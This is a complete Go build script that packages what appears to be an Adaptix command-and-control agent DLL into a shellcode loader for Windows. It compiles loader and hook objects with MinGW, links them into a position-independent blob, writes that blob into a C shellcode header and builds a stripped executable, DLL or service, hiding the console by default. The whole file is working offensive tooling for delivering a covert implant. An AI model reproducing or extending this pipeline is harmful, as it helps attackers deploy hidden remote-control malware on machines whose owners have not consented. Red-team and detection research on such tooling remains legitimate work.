package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const (
	shellcodeTemplate = `#pragma once

// Autogenerated shellcode
// DO NOT EDIT MANUALLY

#include <cstdint>

namespace Shellcode {

    constexpr size_t Size = 0x%X;

    __attribute__((section(".text")))
    const uint8_t Data[] = {
        %s
    };

} // namespace Shellcode
`
)

// Paths relative to project root
var (
	buildDir     = "build"
	srcDir       = "src"
	loaderDir    = "loader"
	includeDir   = filepath.Join(loaderDir, "include")
	outputDir    = "output"
	shellcodeH   = filepath.Join(includeDir, "Shellcode.h")
	loaderSpec   = filepath.Join("crystal_palace", "specs", "loader.spec")
	linkTool     = filepath.Join("crystal_palace", "link")
)

func main() {
	// --- flags ---
	agentDLL := flag.String("dll", "", "Path to the Adaptix agent DLL (e.g. agent.x64.dll)")
	outputName := flag.String("out", "agent", "Base name for the output binary (without extension)")
	format := flag.String("format", "exe", "Output format: exe | dll | svc")
	skipCoff := flag.Bool("skip-coff", false, "Skip COFF compilation (reuse existing .o files in build/)")
	skipLink := flag.Bool("skip-link", false, "Skip Crystal Palace link step (reuse existing agent.bin)")
	picBin := flag.String("pic", "agent.bin", "Path to pre-built PIC blob (used with -skip-link)")
	debug := flag.Bool("debug", false, "Compile with -mconsole instead of -mwindows (shows console output)")
	flag.Parse()

	if *agentDLL == "" && !*skipLink {
		fatal("Please provide the path to the Adaptix agent DLL with -dll <path>")
	}

	// Resolve project root (directory where this binary / go file lives)
	projectRoot, err := os.Getwd()
	check(err, "getting working directory")

	// Ensure required directories exist
	ensureDir(filepath.Join(projectRoot, buildDir))
	ensureDir(filepath.Join(projectRoot, outputDir))

	// ──────────────────────────────────────────────
	// Step 1: Compile COFF objects with MinGW
	// ──────────────────────────────────────────────
	if !*skipCoff {
		info("Compiling COFF objects ...")
		compileCoff(projectRoot)
	} else {
		info("Skipping COFF compilation (--skip-coff)")
	}

	// ──────────────────────────────────────────────
	// Step 2: Link with Crystal Palace
	// ──────────────────────────────────────────────
	picPath := filepath.Join(projectRoot, "build", *picBin)

	if !*skipLink {
		info("Linking PIC with Crystal Palace ...")
		picPath = filepath.Join(projectRoot, "build", "agent.bin")
		linkPIC(projectRoot, *agentDLL, picPath)
	} else {
		info("Skipping Crystal Palace link step (--skip-link)")
	}

	// ──────────────────────────────────────────────
	// Step 3: Convert PIC blob → hex → Shellcode.h
	// ──────────────────────────────────────────────
	info("Generating Shellcode.h from PIC blob ...")
	generateShellcodeHeader(projectRoot, picPath)

	// ──────────────────────────────────────────────
	// Step 4: Compile final binary with clang++
	// ──────────────────────────────────────────────
	info("Compiling final %s binary ...", *format)
	compileFinal(projectRoot, *format, *outputName, *debug)

	info("Done!")
}

// ─── COFF compilation ────────────────────────────────────────────────────────

func compileCoff(root string) {
	cc := "x86_64-w64-mingw32-gcc"
	cflags := []string{
		"-DWIN_X64", "-shared", "-Wall", "-Wno-pointer-arith",
		"-mno-stack-arg-probe", "-fno-zero-initialized-in-bss",
	}

	sources := []struct {
		src string
		obj string
	}{
		{filepath.Join(srcDir, "pico.c"), filepath.Join(buildDir, "pico.x64.o")},
		{filepath.Join(srcDir, "loader.c"), filepath.Join(buildDir, "loader.x64.o")},
		{filepath.Join(srcDir, "services.c"), filepath.Join(buildDir, "services.x64.o")},
		{filepath.Join(srcDir, "hooks.c"), filepath.Join(buildDir, "hooks.x64.o")},
	}

	for _, s := range sources {
		args := append(cflags, "-c", filepath.Join(root, s.src), "-o", filepath.Join(root, s.obj))
		run(root, cc, args...)
	}
}

// ─── Crystal Palace link ─────────────────────────────────────────────────────

func linkPIC(root, dllPath, outPath string) {
	// ./crystal_palace/link loader.spec <agent.x64.dll> <output>
	tool := filepath.Join(root, linkTool)
	spec := filepath.Join(root, loaderSpec)
	run(root, tool, spec, dllPath, outPath)
}

// ─── Shellcode.h generation ──────────────────────────────────────────────────

func generateShellcodeHeader(root, picPath string) {
	data, err := os.ReadFile(picPath)
	check(err, "reading PIC blob %s", picPath)

	hexLines := formatHexArray(data)
	header := fmt.Sprintf(shellcodeTemplate, len(data), hexLines)

	outPath := filepath.Join(root, shellcodeH)
	err = os.WriteFile(outPath, []byte(header), 0644)
	check(err, "writing %s", outPath)

	info("  Shellcode size: %d bytes (0x%X)", len(data), len(data))
}

// formatHexArray turns raw bytes into nicely formatted C hex literal lines.
// Each line has up to 16 bytes: 0xDE, 0xAD, 0xBE, 0xEF, ...
func formatHexArray(data []byte) string {
	if len(data) == 0 {
		return ""
	}

	var sb strings.Builder
	hexStr := hex.EncodeToString(data)

	for i := 0; i < len(hexStr); i += 2 {
		byteIdx := i / 2

		if byteIdx%16 == 0 && byteIdx != 0 {
			sb.WriteString("\n        ")
		} else if byteIdx == 0 {
			// first byte – no extra indent (template already has 8 spaces)
		} else {
			sb.WriteString(" ")
		}

		sb.WriteString("0x")
		sb.WriteString(strings.ToUpper(hexStr[i : i+2]))

		if byteIdx < len(data)-1 {
			sb.WriteString(",")
		}
	}

	return sb.String()
}

// ─── Final binary compilation ────────────────────────────────────────────────

func compileFinal(root, format, baseName string, debug bool) {
	absInclude := filepath.Join(root, includeDir)

	var sourcePath string
	var outputPath string
	var extraFlags []string

	switch format {
	case "exe":
		sourcePath = filepath.Join(root, loaderDir, "source", "main", "Exe.cc")
		outputPath = filepath.Join(root, outputDir, baseName+".exe")
	case "dll":
		sourcePath = filepath.Join(root, loaderDir, "source", "main", "Dll.c")
		outputPath = filepath.Join(root, outputDir, baseName+".dll")
		extraFlags = append(extraFlags, "-shared")
	case "svc":
		sourcePath = filepath.Join(root, loaderDir, "source", "main", "Svc.cc")
		outputPath = filepath.Join(root, outputDir, baseName+".exe")
	default:
		fatal("Unknown format %q. Use exe, dll, or svc.", format)
	}

	subsystem := "-mwindows"
	if debug {
		subsystem = "-mconsole"
		info("  Debug mode: using -mconsole subsystem")
	}

	clangArgs := []string{
		"-target", "x86_64-w64-mingw32",
		"-I", absInclude,
		"-o", outputPath,
		sourcePath,
		"-Os",
		subsystem,
		"-nostdlib",
		"-s",
		"-lkernel32",
		"-ladvapi32",
	}
	clangArgs = append(clangArgs, extraFlags...)

	compiler := "clang++"
	run(root, compiler, clangArgs...)

	info("  Output: %s", outputPath)
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

func run(dir, name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.Dir = dir
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	info("  > %s %s", name, strings.Join(args, " "))
	if err := cmd.Run(); err != nil {
		fatal("command failed: %s %s\n  %v", name, strings.Join(args, " "), err)
	}
}

func ensureDir(path string) {
	if err := os.MkdirAll(path, 0755); err != nil {
		fatal("creating directory %s: %v", path, err)
	}
}

func info(format string, a ...interface{}) {
	fmt.Printf("[*] "+format+"\n", a...)
}

func fatal(format string, a ...interface{}) {
	fmt.Fprintf(os.Stderr, "[!] "+format+"\n", a...)
	os.Exit(1)
}

func check(err error, format string, a ...interface{}) {
	if err != nil {
		fatal("%s: %v", fmt.Sprintf(format, a...), err)
	}
}
